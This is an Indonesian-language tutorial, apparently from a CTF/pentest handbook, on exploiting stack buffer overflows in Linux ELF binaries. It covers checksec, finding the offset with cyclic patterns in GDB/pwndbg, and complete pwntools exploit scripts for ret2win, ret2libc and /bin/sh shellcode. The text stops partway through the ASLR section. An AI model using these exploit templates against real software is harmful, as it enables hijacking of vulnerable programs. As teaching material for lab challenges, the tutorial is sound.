---
id: "49"
title: "💥 49 — Buffer Overflow Workflow"
category: "6. Binary & Reversing"
categoryId: "binary"
filename: "49_buffer_overflow_workflow.md"
refs_out: ["44","47","48","50","51"]
refs_in: ["48","50","52"]
---

# 💥 49 — Buffer Overflow Workflow

> **Category:** Binary Exploitation  
> **Difficulty:** Beginner → Intermediate  
> **Type:** Stack-Based Buffer Overflow  
> **Prerequisite:** File 48 — Binary Analysis Workflow  
> **Target:** Linux ELF binary  
> **Attacker:** Parrot OS XFCE  
> **Primary Tools:** GDB, pwndbg, pwntools, Ghidra, checksec, ROPgadget

---

# 🧭 BAGIAN 0 — FONDASI

## 0.1 💥 Apa Itu Buffer Overflow?

Bayangkan:

```text
BUFFER = kotak dengan ukuran tetap
```

Misalnya kotak hanya dapat menampung:

```text
32 karakter
```

Tetapi program menerima:

```text
200 karakter
```

Maka:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

tidak lagi berhenti di dalam buffer.

Data akan terus menulis ke memory setelah buffer.

Itulah:

```text
BUFFER OVERFLOW
```

---

## 🍽️ Analogi Stack seperti Tumpukan Piring

Bayangkan stack sebagai tumpukan piring:

```text
┌─────────────────────┐
│       Piring 5      │
├─────────────────────┤
│       Piring 4      │
├─────────────────────┤
│       Piring 3      │
├─────────────────────┤
│       Piring 2      │
├─────────────────────┤
│       Piring 1      │
└─────────────────────┘
```

Program mengira:

```text
"Buffer saya hanya sebesar 32 byte."
```

Tetapi attacker memasukkan:

```text
500 byte
```

Akibatnya:

```text
BUFFER
 ↓
SAVED RBP
 ↓
SAVED RIP
 ↓
DATA LAIN
```

ikut tertimpa.

---

# 0.1.1 🧠 Mengapa RIP/EIP Penting?

Saat function selesai, CPU menggunakan:

```text
RIP / EIP
```

untuk mengetahui:

```text
"Instruction berikutnya harus dijalankan di address mana?"
```

Jika attacker dapat mengubah:

```text
SAVED RIP
```

maka alur program dapat dialihkan.

```text
NORMAL

vulnerable()
     │
     ▼
return
     │
     ▼
caller


AFTER OVERFLOW

vulnerable()
     │
     ▼
overwrite saved RIP
     │
     ▼
ATTACKER-CONTROLLED ADDRESS
```

Inilah primitive utama stack BOF:

```text
WRITE OUT OF BOUNDS
        ↓
OVERWRITE CONTROL DATA
        ↓
CONTROL INSTRUCTION POINTER
```

---

# 0.2 🧠 Memory Layout Stack

Model sederhana:

```text
HIGH ADDRESS
┌──────────────────────────────┐
│ caller local data            │
├──────────────────────────────┤
│ saved RIP                    │ ← TARGET UTAMA
├──────────────────────────────┤
│ saved RBP                    │
├──────────────────────────────┤
│ local variable               │
├──────────────────────────────┤
│ local variable               │
├──────────────────────────────┤
│ buffer[64]                   │ ← INPUT MASUK DI SINI
└──────────────────────────────┘
LOW ADDRESS
```

Ketika overflow:

```text
HIGH ADDRESS
┌──────────────────────────────┐
│ attacker data                │
├──────────────────────────────┤
│ 4242424242424242             │ ← RIP
├──────────────────────────────┤
│ AAAAAAAAAAAAAAAA             │
├──────────────────────────────┤
│ AAAAAAAAAAAAAAAA             │
├──────────────────────────────┤
│ AAAAAAAAAAAAAAAA             │ ← buffer
└──────────────────────────────┘
LOW ADDRESS
```

---

# 0.2.1 🔄 Before vs After

## Sebelum

```text
buffer:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

saved RBP:
0x7fffffffe200

saved RIP:
0x4011d4
```

## Sesudah overflow

```text
buffer:
AAAAAAAAAAAA...

saved RBP:
4141414141414141

saved RIP:
4242424242424242
```

Sekarang:

```text
RIP
=
attacker-controlled
```

---

# 0.2.2 🎯 Kenapa RIP/EIP?

Karena:

```text
RIP
=
instruction pointer
```

dan:

```text
EIP
=
instruction pointer pada x86 32-bit
```

Jika kita bisa mengontrolnya:

```text
RIP/EIP control
        ↓
Redirect execution
```

kemudian bisa memilih:

```text
ret2win
ret2libc
ROP
shellcode
```

---

# 0.3 🚪 Prerequisite dari File 48

Jangan masuk File 49 hanya karena binary crash.

Minimal:

```text
[✓] Binary teridentifikasi
[✓] Architecture diketahui
[✓] checksec dijalankan
[✓] Binary bisa direproduksi crash
[✓] GDB bisa melihat crash
[✓] Ada indikasi input dapat merusak control data
```

Idealnya:

```text
[✓] RIP/EIP sudah terbukti dapat dipengaruhi
[ ] Offset belum diketahui
```

Jika belum tahu apakah crash benar-benar berkaitan dengan stack overflow:

```text
kembali ke
./[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis)
```

---

# 0.4 📊 Tipe Buffer Overflow

|Tipe|Deskripsi|File Ini|
|---|---|---|
|Stack BOF|Overflow pada stack buffer|✅ FOCUS|
|Heap BOF|Overflow pada heap allocation|❌ File 52|
|Off-by-one|Overflow sangat kecil, sering 1 byte|🟡 Mention|
|Integer overflow|Arithmetic wraparound memicu allocation/size bug|🟡 Mention|
|Format string|Format control memory primitive|❌ File 50/lanjutan|
|Use-after-free|Access terhadap object yang sudah dibebaskan|❌ File 52+|

---

# 🛡️ BAGIAN 1 — CHECKLIST SEBELUM EXPLOIT

# 1.0 🧰 Install & Setup Tools (Parrot OS)

Sebelum memulai, pastikan toolchain binary exploitation sudah terpasang:

```bash
# 1. Cek apakah pwndbg sudah terpasang
gdb --version
# Lalu buka GDB, lihat apakah ada prompt "pwndbg>"

# Install pwndbg di Parrot OS (jika belum ada)
git clone https://github.com/pwndbg/pwndbg.git
cd pwndbg
./setup.sh

# Verifikasi setelah install
gdb ./binary
# Seharusnya prompt berubah menjadi: pwndbg>

# 2. Install pwntools (jika belum ada)
pip3 install pwntools

# Verifikasi pwntools
python3 -c "from pwn import *; print('pwntools OK')"

# 3. Install ROPgadget
pip3 install ROPgadget

# 4. Install checksec
sudo apt install checksec
# atau
pip3 install checksec.py
```

---

# 1.1 ✅ Checklist dari File 48

```bash
# 1. Identifikasi binary
file ./binary

# 2. Permission dan ownership
ls -la ./binary

# 3. Security mitigations
checksec --file=./binary

# 4. Confirm crash
python3 -c 'print("A"*200)' | ./binary
```

Contoh:

```text
Segmentation fault
```

Sekarang masuk GDB.

---

# 1.1.1 📥 Identifikasi Vektor Input Binary (stdin vs argv vs File vs Socket)

Tidak semua CTF binary menerima input melalui standard input (`stdin`). Perhatikan cara binary menerima payload:

```bash
# Input via stdin (Paling umum — fgets/gets/scanf/read)
python3 -c 'print("A"*200)' | ./binary

# Input via command line argument (argv[1])
./binary $(python3 -c 'print("A"*200)')
# Di Pwntools: p = process([elf.path, payload])

# Input via file
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*200)' > input.bin
./binary < input.bin
# Di Pwntools: p = process([elf.path, "input.bin"])

# Input via network socket (Remote)
nc host port
# Di Pwntools: p = remote("host", port)
```

### 💡 Cara Identifikasi:
- Cek source code / disassembly Ghidra atau jalankan binary tanpa input (`./binary`):
  - Jika binary **langsung menunggu input** (kursor berkedip) → **stdin**
  - Jika binary **langsung crash / exit tanpa menunggu input** → Cek **argv** / argument parsing

---

# 1.2 🛡️ Interpretasi `checksec` untuk BOF

Gunakan tabel ini sebagai **decision matrix awal**, bukan hukum absolut.

|Canary|NX|PIE|Strategy Awal|
|---|---|---|---|
|No|No|No|ret2win / shellcode candidate|
|No|Yes|No|ret2win / ret2libc / ROP|
|No|Yes|Yes|Leak + address calculation + ROP/ret2libc|
|Yes|*|*|Canary bypass/leak biasanya dibutuhkan|
|No|No|Yes|Shellcode possible tetapi address masih perlu ditangani|

---

# 1.2.1 🟢 No Canary

Artinya stack tidak memiliki stack canary untuk mendeteksi overwrite.

Contoh:

```text
Canary: No
```

Maka:

```text
buffer
 ↓
saved RBP
 ↓
saved RIP
```

lebih langsung untuk dieksploitasi.

---

# 1.2.2 🟡 NX Enabled

NX:

```text
Non-Executable
```

berarti data memory tertentu seperti stack biasanya tidak dapat dieksekusi sebagai code.

Akibat:

```text
NX ON
 ↓
stack shellcode tidak langsung
 ↓
return-to-existing-code
```

Contohnya:

```text
ret2win
ret2libc
ROP
```

---

# 1.2.3 🟢 NX Disabled

Jika:

```text
NX: disabled
```

stack dapat menjadi executable.

Maka:

```text
input shellcode
    ↓
redirect RIP
    ↓
stack shellcode
```

menjadi kandidat.

---

# 1.2.4 🟡 PIE

PIE enabled:

```text
binary base
=
berubah karena ASLR
```

PIE disabled:

```text
code address
=
lebih predictable
```

---

# 1.2.5 🔐 Canary Enabled

Canary berada di antara local buffer dan control data.

Model:

```text
buffer
 ↓
CANARY
 ↓
saved RBP
 ↓
saved RIP
```

Overflow:

```text
buffer
 ↓
overwrite canary
 ↓
canary mismatch
 ↓
SIGABRT
```

Karena itu:

```text
Canary enabled
```

sering berarti:

```text
leak canary
```

diperlukan sebelum overwrite RIP yang valid.

---

# 💥 BAGIAN 2 — MENEMUKAN OFFSET

# 2.1 🔎 Metode Manual Binary Search

Ini metode paling sederhana tetapi paling lambat.

Misalnya:

```bash
# 200 byte
python3 -c 'print("A"*200)' | ./binary
```

Crash.

Coba:

```bash
# 100 byte
python3 -c 'print("A"*100)' | ./binary
```

Jika masih crash:

```bash
# 50 byte
python3 -c 'print("A"*50)' | ./binary
```

Lalu:

```text
200 crash
100 crash
50 tidak crash
```

Sekarang:

```text
50 ───────── 100
```

Lanjut:

```text
75
87
93
...
```

hingga menemukan batas.

### Kelemahan

Manual method hanya memberi:

```text
"sekitar byte ke-N"
```

Cyclic pattern memberi:

```text
"exact offset"
```

---

# 2.1.1 🆚 Binary Search vs Cyclic

|Method|Kelebihan|Kekurangan|
|---|---|---|
|Manual|Mudah dipahami|Lambat|
|Cyclic|Exact offset|Perlu memahami pattern|
|pwndbg cyclic|Sangat cepat|Perlu pwndbg|

### Recommended

```text
CYCLIC
```

---

# 2.2 🔢 Cyclic Pattern — RECOMMENDED

Cyclic pattern menghasilkan string unik sehingga jika sebagian pattern masuk ke RIP/EIP:

```text
RIP value
 ↓
search pattern
 ↓
exact offset
```

---

# 2.2.1 Step 1 — Generate Pattern

```bash
# Generate 300-byte cyclic pattern
python3 -c \
'from pwn import cyclic; print(cyclic(300).decode())'
```

Lebih aman untuk binary yang membaca raw bytes:

```bash
# Generate binary-safe cyclic pattern
python3 -c \
'from pwn import cyclic; import sys; sys.stdout.buffer.write(cyclic(300))'
```

---

# 2.2.2 Step 2 — Jalankan dalam GDB (Cara Input Python ke GDB)

### 💡 Penjelasan Syntax `< <(...)`:
Pemula sering bingung mengapa menggunakan `run < <(...)` bukannya pipe langsung (`| gdb`).
Syntax `< <(...)` adalah **Process Substitution** di Bash. Syntax ini mengarahkan stdout dari script Python ke stdin binary di dalam GDB tanpa merusak sesi TTY/shell interaktif GDB.

### 4 Cara Jalankan GDB dengan Input dari Python:

```bash
# Cara 1: Process substitution (RECOMMENDED untuk binary interaktif)
gdb ./binary
pwndbg> run < <(python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))')

# Cara 2: Pipe langsung (bisa gagal jika binary membutuhkan input TTY / stdin lanjutan)
python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))' | gdb ./binary

# Cara 3: Simpan ke file dulu (paling aman untuk debugging panjang)
python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(300))' > /tmp/input.bin
gdb ./binary
pwndbg> run < /tmp/input.bin

# Cara 4: Menggunakan pwntools gdb.debug() (paling powerful dari script exploit)
# (Dibahas detail pada Bagian 9.3)
```

---

# 2.2.3 Step 3 — Crash

Contoh:

```text
Program received signal SIGSEGV, Segmentation fault.
0x00000000006161616e in ?? ()
```

Karena:

```text
0x61 = 'a'
```

maka:

```text
0x6161616e
```

adalah bagian dari pattern.

---

# 2.2.4 Step 4 — Check RIP

```gdb
# Lihat instruction pointer
info registers rip
```

Contoh:

```text
rip            0x6161616e          0x6161616e
```

Sekarang kita tahu:

```text
RIP controlled
```

dan memiliki:

```text
pattern fragment
```

---

# 2.2.5 Step 5 — Cari Offset (32-bit vs 64-bit)

### Untuk 32-bit binary (EIP - 4 byte value):
```bash
python3 -c 'from pwn import *; print(cyclic_find(0x6161616e))'
```

### Untuk 64-bit binary (RIP / RSP - 8 byte value):
Gunakan `n=8` karena pointer 64-bit berukuran 8 byte:
```bash
python3 -c 'from pwn import *; print(cyclic_find(0x6161616161616162, n=8))'
```

### Cara lebih mudah: pakai pwndbg langsung
Di dalam GDB setelah crash:
```gdb
# pwndbg otomatis cari offset dari RSP stack pointer:
pwndbg> cyclic -l $rsp

# Atau cari dari nilai hex:
pwndbg> cyclic -l 0x6161616e
```

### Atau baca dari RSP stack setelah crash:
```gdb
pwndbg> x/1gx $rsp
0x7fffffffe1c8: 0x6161616161616162
```
Lalu di terminal:
```bash
python3 -c 'from pwn import *; print(cyclic_find(0x6161616161616162, n=8))'
```

Misalnya output:

```text
72
```

Maka:

```text
OFFSET = 72
```

---

# 2.2.6 🧠 Kenapa Cyclic Bisa Bekerja?

Misalnya pattern:

```text
aaaabaaacaaadaaaeaaafaaa...
```

Setiap kombinasi dibuat unik dalam range pattern.

Jika RIP menjadi:

```text
0x6161616e
```

Python mencari:

```text
"naaa"
```

dalam pattern.

Hasil:

```text
index = 72
```

Maka:

```text
72 byte
↓
RIP
```

---

# 2.2.7 32-bit vs 64-bit

## 32-bit

Instruction pointer:

```text
EIP
```

Biasanya value yang diperoleh:

```text
0x6161616e
```

4 byte.

---

## 64-bit

Instruction pointer:

```text
RIP
```

secara teori 8 byte.

Tetapi ada komplikasi.

Pada x86-64, address harus memenuhi aturan **canonical address**. Nilai pattern seperti:

```text
0x6161616161616161
```

bukan canonical user-space address.

Akibat:

```text
CPU
 ↓
invalid instruction address
 ↓
SIGSEGV
```

Karena itu kadang RIP tidak menampilkan pattern secara langsung.

---

# 2.2.8 🔍 Jika RIP Tidak Menampilkan Pattern

Gunakan:

```gdb
# Lihat stack
x/20gx $rsp
```

Contoh:

```text
0x7fffffffe1c8: 0x6161616161616162  0x6161616161616163
0x7fffffffe1d8: 0x6161616161616164  0x6161616161616165
```

Cari fragment pattern.

Kemudian:

```bash
# Cari posisi pattern berdasarkan value yang relevan
python3 -c \
'from pwn import *; print(cyclic_find(0x61616162))'
```

### ⚠️ Endianness

Jika memory menunjukkan:

```text
62 61 61 61
```

nilai integer yang dibaca bisa menjadi:

```text
0x61616162
```

bukan:

```text
0x62616161
```

Karena x86 menggunakan:

```text
LITTLE ENDIAN
```

---

# 2.3 🐞 pwndbg Cyclic

Jika pwndbg terpasang:

```bash
# Open binary
gdb ./binary
```

Di GDB:

```gdb
# Generate pattern
cyclic 300
```

Kemudian:

```gdb
# Run
run
```

Setelah crash:

```gdb
# Cari offset dari value
cyclic -l 0x6161616e
```

pwndbg juga dapat memberikan contextual crash information secara otomatis.

---

# 2.4 📐 64-bit vs 32-bit

|Property|32-bit|64-bit|
|---|---|---|
|Instruction pointer|EIP|RIP|
|Pointer size|4 byte|8 byte|
|Function args|Stack-based convention|Register-based SysV|
|Typical return address|4 byte|8 byte|
|Common calling convention|cdecl|System V AMD64|
|Stack alignment|4/varies|16-byte ABI alignment|
|`/bin/sh` ret2libc setup|Stack args|Registers, terutama RDI|

### 64-bit register arguments

```text
1st argument → RDI
2nd argument → RSI
3rd argument → RDX
4th argument → RCX
5th argument → R8
6th argument → R9
```

Ini akan menjadi sangat penting untuk:

```text
ret2libc
ROP
```

---

# 🎯 BAGIAN 3 — KONTROL RIP/EIP

# 3.1 ✅ Verify Kontrol

Setelah menemukan:

```text
OFFSET = 72
```

buat payload sederhana:

```python
#!/usr/bin/env python3

from pwn import *

# Load ELF binary
elf = ELF("./binary", checksec=False)

# Konfigurasi context berdasarkan binary
context.binary = elf

# Offset hasil cyclic
OFFSET = 72

# Buat payload:
# 72 byte padding
# lalu 8 byte "B"
payload = (
    b"A" * OFFSET +
    b"B" * 8
)

# Jalankan binary lokal
p = process(elf.path)

# Kirim payload
p.sendline(payload)

# Tunggu sampai process crash
p.wait()
```

---

# 3.1.1 🔍 Check RIP

Masuk GDB dan jalankan payload.

Expected:

```text
RIP = 0x4242424242424242
```

Karena:

```text
B = 0x42
```

dan:

```text
BBBBBBBB
```

menjadi:

```text
0x4242424242424242
```

---

# 3.2 🧠 Kenapa `0x4242424242424242`?

Karena ASCII:

```text
B = 0x42
```

8 byte:

```text
42 42 42 42 42 42 42 42
```

dibaca sebagai:

```text
0x4242424242424242
```

Artinya:

```text
RIP
 ↓
attacker controlled
```

---

# 3.2.1 ⚠️ Canonical Address

Masalah:

```text
0x4242424242424242
```

bukan valid canonical user-space address pada sistem x86-64 Linux umum.

Jadi:

```text
RIP = 0x4242424242424242
```

digunakan untuk **membuktikan control**, bukan untuk benar-benar melanjutkan eksekusi.

Pada payload nyata:

```text
RIP
↓
valid executable address
```

misalnya:

```text
0x4011d6
```

---

# 💥 BAGIAN 4 — SCENARIO 1: ret2win

# 4.1 🏆 Apa Itu ret2win?

ret2win adalah pattern paling mudah untuk belajar BOF.

Binary memiliki:

```text
main()
  ↓
vulnerable()
```

dan hidden/special function:

```text
win()
```

Misalnya:

```c
void win()
{
    system("/bin/sh");
}
```

atau:

```c
void win()
{
    puts("FLAG{...}");
}
```

Tujuan:

```text
overflow
   ↓
overwrite RIP
   ↓
address win()
   ↓
win()
```

Diagram:

```text
NORMAL

main
 ↓
vulnerable
 ↓
return
 ↓
main


ATTACK

main
 ↓
vulnerable
 ↓
overflow
 ↓
overwrite RIP
 ↓
win()
 ↓
FLAG / SHELL
```

---

# 4.2 🔎 Identifikasi `win()`

## Method 1 — nm

```bash
# Cari symbol bernama win/flag/shell/admin
nm ./binary | \
grep -E 'win|flag|shell|admin'
```

Contoh:

```text
0000000000401176 T win
```

Berarti:

```text
win() = 0x401176
```

---

## Method 2 — GDB

```bash
# Open binary
gdb ./binary
```

```gdb
# List functions
info functions
```

Cari:

```text
0x0000000000401176  win
```

---

## Method 3 — readelf

```bash
# Search symbol table
readelf -s ./binary | \
grep -E 'win|flag|shell'
```

---

## Method 4 — Ghidra

```text
Symbol Tree
 ↓
Functions
 ↓
win
```

---

# 4.3 🎯 Dapatkan Address `win()`

Pwntools:

```python
from pwn import *

# Parse ELF
elf = ELF("./binary", checksec=False)

# Ambil address symbol "win"
win_addr = elf.sym["win"]

# Print address
print(hex(win_addr))
```

Output:

```text
0x401176
```

---

# 4.4 🧨 Build Exploit ret2win

```python
#!/usr/bin/env python3

from pwn import *

# ==========================================
# LOAD BINARY
# ==========================================

# Parse ELF binary agar pwntools tahu:
# symbols
# architecture
# sections
# addresses
elf = ELF("./binary", checksec=False)

# Set context berdasarkan ELF
context.binary = elf

# Output log yang tidak terlalu ramai
context.log_level = "info"


# ==========================================
# OFFSET
# ==========================================

# Hasil dari cyclic_find()
OFFSET = 72


# ==========================================
# WIN FUNCTION
# ==========================================

# Ambil address function win()
WIN = elf.sym["win"]

# Tampilkan address
log.info(f"win() @ {hex(WIN)}")


# ==========================================
# BUILD PAYLOAD
# ==========================================

payload = flat(
    # Isi buffer + control data sampai RIP
    b"A" * OFFSET,

    # Ganti saved RIP dengan address win()
    p64(WIN)
)


# ==========================================
# RUN LOCAL
# ==========================================

# Start binary
p = process(elf.path)

# Kirim payload
p.sendline(payload)


# ==========================================
# INTERACTIVE
# ==========================================

# Jika win() memberi shell,
# kita mendapatkan interactive shell.
p.interactive()
```

---

# 4.4.1 🧩 Breakdown Payload

Secara konseptual:

```text
OFFSET = 72
```

berarti:

```text
AAAAAAAA...
72 bytes
```

mengisi:

```text
buffer
+
saved RBP
+
data lain
```

sampai tepat sebelum RIP.

Kemudian:

```text
p64(WIN)
```

menjadi:

```text
saved RIP = WIN
```

Maka:

```text
ret
 ↓
0x401176
 ↓
win()
```

---

# 4.4.2 🧪 Expected Output

Contoh:

```text
[*] '/home/user/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE
    Stripped:   No

[*] win() @ 0x401176
[*] Starting local process './binary'
[*] Switching to interactive mode

Congratulations!
FLAG{ret2win_example}
```

---

# 4.5 📐 ret2win + Stack Alignment

Ini masalah klasik 64-bit.

Misalnya:

```text
overflow
 ↓
win()
 ↓
system()
 ↓
crash
```

Padahal:

```text
WIN address benar
```

Kenapa?

Salah satu penyebab umum adalah:

```text
stack alignment
```

x86-64 System V ABI menggunakan alignment 16-byte sebelum call tertentu.

`system()` atau libc function tertentu dapat mengandung instruction seperti:

```asm
movaps
```

yang sensitif terhadap alignment.

---

# 4.5.1 🔧 Extra `ret`

Tambahkan satu gadget:

```text
ret
 ↓
win
```

Contoh:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./binary", checksec=False)
context.binary = elf

OFFSET = 72
WIN = elf.sym["win"]

# Buat ROP helper
rop = ROP(elf)

# Cari gadget "ret"
RET = rop.find_gadget(["ret"])[0]

log.info(f"ret @ {hex(RET)}")
log.info(f"win @ {hex(WIN)}")

payload = flat(
    # Padding sampai RIP
    b"A" * OFFSET,

    # Extra ret untuk alignment
    p64(RET),

    # Lanjut ke win()
    p64(WIN)
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

---

# 4.5.2 🧠 Apa yang Berubah?

Tanpa alignment gadget:

```text
RIP → win
```

Dengan:

```text
RIP → ret → win
```

`ret` menggeser stack:

```text
RSP += 8
```

sehingga alignment dapat menjadi sesuai dengan kebutuhan chain.

### ⚠️ Jangan selalu menambahkan `ret`

Gunakan ketika:

```text
crash terjadi di libc
+
alignment mismatch dicurigai
```

Bukan sebagai ritual.

---

# 🔗 BAGIAN 5 — SCENARIO 2: ret2libc

# 5.1 🧠 Konsep ret2libc

Ret2libc dipakai ketika:

```text
binary
```

tidak memiliki:

```text
win()
```

tetapi libc memiliki:

```text
system()
```

dan:

```text
"/bin/sh"
```

Pattern:

```text
overflow
   ↓
system("/bin/sh")
```

---

# 5.1.1 32-bit vs 64-bit

### 32-bit

Argumen function banyak dipassing melalui stack:

```text
[padding]
[system]
[return]
[/bin/sh]
```

### 64-bit

Argumen pertama berada di:

```text
RDI
```

Maka:

```text
ROP gadget
 ↓
pop rdi
 ↓
"/bin/sh" address
 ↓
system
```

Diagram:

```text
[padding]
[ret]
[pop rdi ; ret]
[address "/bin/sh"]
[address system]
```

---

# 5.2 🌪️ ASLR dan libc

Cek ASLR:

```bash
# Check Linux ASLR
cat /proc/sys/kernel/randomize_va_space
```

Umumnya:

```text
0
```

berarti:

```text
disabled
```

sedangkan:

```text
2
```

berarti:

```text
full randomization
```

---

# 5.2.1 🟢 ASLR OFF

Jika:

```text
ASLR = 0
PIE = disabled
```

address lebih predictable.

Cocok untuk:

```text
simple ret2libc
```

---

# 5.2.2 🔴 ASLR ON

Jika ASLR aktif:

```text
libc base berubah
```

maka:

```text
system()
```

tidak boleh dianggap memiliki address tetap.

Biasanya:

```text
LEAK
 ↓
LIBC BASE
 ↓
system
 ↓
"/bin/sh"
```

Detail leak/ROP dibahas di:

```text
./[🔗 50 — ROP Chain Workflow](/docs/rop-chain)
```

---

# 5.3 🧪 ret2libc Tanpa ASLR

## Step 1 — Tentukan libc

```bash
# Lihat libraries yang digunakan
ldd ./binary
```

Contoh:

```text
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

Kemudian:

```python
from pwn import *

# Binary
elf = ELF("./binary", checksec=False)

# Gunakan libc yang benar-benar dipakai binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

# Print system offset
print(hex(libc.sym["system"]))
```

---

# 5.3.1 🔥 Cari `/bin/sh`

```python
from pwn import *

# Parse libc
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

# Cari string /bin/sh
binsh = next(libc.search(b"/bin/sh\x00"))

print(hex(binsh))
```

Perhatikan:

```text
libc.sym["system"]
```

dan:

```text
binsh
```

adalah **offset dalam libc**, bukan selalu runtime address.

Jika ASLR off:

```text
runtime base
=
known
```

sehingga:

```text
absolute address
=
base + offset
```

---

# 5.3.2 🔎 Cari `pop rdi; ret`

```bash
# Cari gadget pop rdi
ROPgadget --binary ./binary | \
grep "pop rdi"
```

Contoh:

```text
0x00000000004012b3 : pop rdi ; ret
```

Alternative:

```bash
# ropper
ropper -f ./binary --search "pop rdi; ret"
```

---

# 5.3.3 🧨 Build Simple ret2libc

Misalnya:

```text
OFFSET = 72
POP_RDI = 0x4012b3
RET = 0x40101a
SYSTEM = known absolute libc address
BINSH = known absolute libc address
```

Script:

```python
#!/usr/bin/env python3

from pwn import *

# Load binary
elf = ELF("./binary", checksec=False)
context.binary = elf

# Load the exact libc used by the target
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",
           checksec=False)

# Offset hasil cyclic
OFFSET = 72

# Gadget
POP_RDI = 0x4012b3
RET = 0x40101a

# IMPORTANT:
# This assumes libc base/address is known,
# for example because ASLR is disabled in the lab.
LIBC_BASE = 0x7ffff7dc0000

# Convert libc offsets into runtime addresses
SYSTEM = LIBC_BASE + libc.sym["system"]
BINSH = LIBC_BASE + next(libc.search(b"/bin/sh\x00"))

log.info(f"libc base = {hex(LIBC_BASE)}")
log.info(f"system    = {hex(SYSTEM)}")
log.info(f"/bin/sh   = {hex(BINSH)}")

# Build ROP payload
payload = flat(
    # Padding to saved RIP
    b"A" * OFFSET,

    # Alignment gadget
    p64(RET),

    # pop rdi ; ret
    p64(POP_RDI),

    # First argument = "/bin/sh"
    p64(BINSH),

    # Call system()
    p64(SYSTEM)
)

# Start target
p = process(elf.path)

# Send payload
p.sendline(payload)

# Interactive shell
p.interactive()
```

### ⚠️ Hal penting

Jangan copy:

```text
LIBC_BASE = 0x7ffff7dc0000
```

ke target lain.

Itu hanya contoh.

Untuk challenge berbeda:

```text
libc version
+
ASLR
+
base
```

dapat berbeda.

---

# 5.3.4 🧠 Mengapa `pop rdi`?

Karena pada Linux x86-64:

```text
argument #1
=
RDI
```

`system()` membutuhkan:

```c
system(char *command);
```

Maka kita ingin:

```text
RDI = address("/bin/sh")
```

Gadget:

```text
pop rdi ; ret
```

melakukan:

```text
RDI = next stack value
```

Sehingga:

```text
pop rdi
 ↓
"/bin/sh"
```

kemudian:

```text
ret
 ↓
system
```

---

# 5.4 🧰 ROPgadget

Install:

```bash
# Install ROPgadget
python3 -m pip install ROPgadget
```

Cari ret:

```bash
# Ret gadget
ROPgadget --binary ./binary | \
grep ": ret$"
```

Cari pop RDI:

```bash
# pop rdi ; ret
ROPgadget --binary ./binary | \
grep "pop rdi"
```

Semua gadget:

```bash
# Full gadget listing
ROPgadget --binary ./binary
```

---

# 5.4.1 🧩 Pwntools ROP

```python
from pwn import *

# Parse binary
elf = ELF("./binary", checksec=False)

# Build ROP database
rop = ROP(elf)

# Find pop rdi ; ret
pop_rdi = rop.find_gadget(["pop rdi", "ret"])

# Print result
print(pop_rdi)
```

---

# 5.5 🌊 Leak + ret2libc

Dengan ASLR:

```text
system()
=
unknown runtime address
```

Maka:

```text
leak libc function
        ↓
calculate libc base
        ↓
system = base + offset
        ↓
"/bin/sh" = base + offset
```

Typical leak:

```text
puts@GOT
```

dipanggil melalui:

```text
puts(puts@GOT)
```

kemudian output:

```text
actual libc address
```

dipakai untuk menghitung:

```text
libc_base
```

### Untuk detail:

```text
→ ./<a href="/docs/rop-chain" class="text-[#00b4d8] hover:underline font-mono font-semibold">50_rop_chain_workflow.md</a>
```

---

# 🐚 BAGIAN 6 — SCENARIO 3: SHELLCODE

# 6.1 🟢 Kapan Digunakan?

Gunakan shellcode approach terutama ketika:

```text
checksec
```

menunjukkan:

```text
NX: disabled
```

dan kita memiliki cara redirect execution ke shellcode.

---

# 6.2 🧬 Generate Shellcode

Pwntools:

```python
from pwn import *

# Gunakan Linux x86-64
context.arch = "amd64"
context.os = "linux"

# Generate /bin/sh shellcode
shellcode = asm(shellcraft.sh())

# Print bytes
print(shellcode)

# Print length
print(len(shellcode))
```

---

# 6.2.1 🔍 Lihat Assembly

```python
from pwn import *

# Set architecture
context.arch = "amd64"
context.os = "linux"

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Disassemble shellcode
print(disasm(shellcode))
```

---

# 6.3 💥 Basic Shellcode Payload

Asumsi:

```text
OFFSET = 72
BUFFER_ADDR = known
NX = disabled
```

```python
#!/usr/bin/env python3

from pwn import *

# Load binary
elf = ELF("./binary", checksec=False)
context.binary = elf

# Offset
OFFSET = 72

# Example buffer address
# MUST be determined for the actual target.
BUFFER_ADDR = 0x7fffffffe200

# Generate Linux x64 /bin/sh shellcode
shellcode = asm(shellcraft.sh())

# Construct payload:
payload = flat(
    # Place shellcode at beginning
    shellcode,

    # Fill until saved RIP
    b"A" * (OFFSET - len(shellcode)),

    # Redirect execution to buffer
    p64(BUFFER_ADDR)
)

# Start process
p = process(elf.path)

# Send payload
p.sendline(payload)

# Interactive shell
p.interactive()
```

---

# 6.3.1 ⚠️ Caveat

Script di atas adalah **pattern pembelajaran**, bukan jaminan satu-layout-cocok-semua.

Perlu diketahui:

```text
BUFFER_ADDR
```

harus benar-benar cocok dengan target.

Selain itu:

```text
shellcode length
buffer length
offset
alignment
stack address
ASLR
```

harus konsisten.

---

# 6.4 🐞 Cari Buffer Address di GDB

Break:

```gdb
# Break pada vulnerable function
break vulnerable_func
```

Run:

```gdb
# Start
run
```

Check register:

```gdb
# Stack pointer
info registers rsp
```

Kemudian:

```gdb
# Examine stack
x/40gx $rsp
```

Jika source/debug symbol tersedia, inspect buffer lokal sesuai debug information.

Contoh:

```gdb
# Print local buffer address jika symbol tersedia
p &buffer
```

Output:

```text
$1 = (char (*)[64]) 0x7fffffffe1d0
```

Sekarang:

```text
BUFFER_ADDR = 0x7fffffffe1d0
```

---

# 6.4.1 🌪️ ASLR

Jika:

```text
ASLR = ON
```

buffer address dapat berubah.

